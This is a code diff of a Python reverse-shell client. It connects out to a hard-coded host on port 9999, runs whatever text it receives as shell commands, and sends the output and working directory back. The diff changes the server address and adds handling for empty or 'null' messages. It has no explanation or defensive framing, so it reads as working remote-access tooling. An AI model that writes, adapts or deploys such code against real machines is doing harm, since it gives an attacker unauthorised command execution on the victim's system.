@@ -63,15 +63,17 @@ def receive_commands():
                     else:
                         f.write(data)
                         data = s.recv(1024)
-        elif len(data) > 0:
+        elif (len(data) > 0) and (data.decode("utf-8") != "null"):
             """In other cases, execute another shell command using a child program in a new process
-the command must be typed as in a shell prompt
+                    the command must be typed as in a shell prompt
             """
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_bytes, "utf-8", errors='ignore')
             s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+        else:
+            s.send(str.encode(os.getcwd() + '> '))
 
         while not data:
             connect_to_server()
@@ -84,7 +86,7 @@ def connect_to_server():
         global host
         global port
         global s
-        host = "192.168.0.241"
+        host = "192.168.0.66"
         port = 9999
         s = socket.socket()
         s.connect((host, port))
